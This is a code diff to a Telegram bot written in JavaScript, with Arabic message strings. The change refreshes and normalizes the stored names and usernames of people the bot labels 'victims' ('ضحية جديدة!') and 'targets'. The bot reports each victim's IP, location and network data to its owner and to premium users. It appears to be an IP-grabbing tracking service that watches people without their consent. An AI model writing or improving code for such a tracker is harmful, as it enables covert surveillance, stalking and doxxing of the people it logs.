@@ -120,20 +120,36 @@ function _addToBuf(tid, ip, key, val) {
   _notifBuf.get(k).parts[key] = val;
 }
 
-function _flushBuf(tid, ip) {
+async function _flushBuf(tid, ip) {
   const k = `${tid}:${ip}`;
   const buf = _notifBuf.get(k);
   if (!buf) return;
   _notifBuf.delete(k);
   if (settings.silentMode) return;
   const p = buf.parts;
-  const prof = profiles[String(tid)] || {};
+  // Try to get fresh profile from Telegram if not stored / username missing
+  let prof = profiles[String(tid)] || {};
+  if (!prof.name || !prof.username) {
+    try {
+      const chat = await bot.getChat(Number(tid));
+      const freshName = [chat.first_name, chat.last_name].filter(Boolean).join(" ") || prof.name || "مجهول";
+      const freshUser = chat.username || prof.username || "";
+      // Normalize: remove leading @ if stored with it (old records)
+      const cleanUser = freshUser.startsWith("@") ? freshUser.slice(1) : freshUser;
+      prof = { ...prof, name: freshName, username: cleanUser };
+      // Update stored profile
+      profiles[String(tid)] = { ...profiles[String(tid)], name: freshName, username: cleanUser, seen: prof.seen || new Date().toJSON().slice(0,19).replace('T',' ') };
+      saveProfiles();
+    } catch(e) {}
+  }
+  // Normalize stored username (remove @ if old record saved it with @)
+  const displayUser = (prof.username || "").startsWith("@") ? prof.username.slice(1) : (prof.username || "");
   const isTarget = targets.has(tid);
   const flag = isTarget ? '🎯🚨' : '⚠️';
   // Full message (owner only) — includes name/username/ID
   let ownerMsg = `${flag} *ضحية جديدة!*\n`;
-  if (prof.name)     ownerMsg += `👤 الاسم: ${prof.name}\n`;
-  if (prof.username) ownerMsg += `🔗 اليوزر: @${prof.username}\n`;
+  if (prof.name)  ownerMsg += `👤 الاسم: ${prof.name}\n`;
+  if (displayUser) ownerMsg += `🔗 اليوزر: @${displayUser}\n`;
   ownerMsg += `🆔 ID: \`${tid}\`\n`;
   ownerMsg += `━━━━━━━━━━━━━━━\n`;
   if (p.ip)       ownerMsg += `⚓ IP: \`${p.ip}\`\n`;
@@ -155,7 +171,6 @@ function _flushBuf(tid, ip) {
   if (Number(tid) === BOT_OWNER) {
     bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown"}).catch(()=>{});
   } else {
-    // Owner gets full info; premium user gets only location/network data
     bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown"}).catch(()=>{});
     bot.sendMessage(Number(tid), premMsg, {parse_mode:"Markdown"}).catch(()=>{});
   }
@@ -943,11 +958,11 @@ bot.on('message', async (msg) => {
 
   users.add(chatId);
   saveUsers();
-  // Save user profile (name + username)
+  // Save user profile (name + username — store username WITHOUT @ prefix)
   const pid = String(chatId);
   profiles[pid] = {
     name: [msg.chat.first_name, msg.chat.last_name].filter(Boolean).join(" ") || "مجهول",
-    username: msg.chat.username ? `@${msg.chat.username}` : "",
+    username: msg.chat.username || "",
     seen: new Date().toJSON().slice(0,19).replace('T',' ')
   };
   saveProfiles();
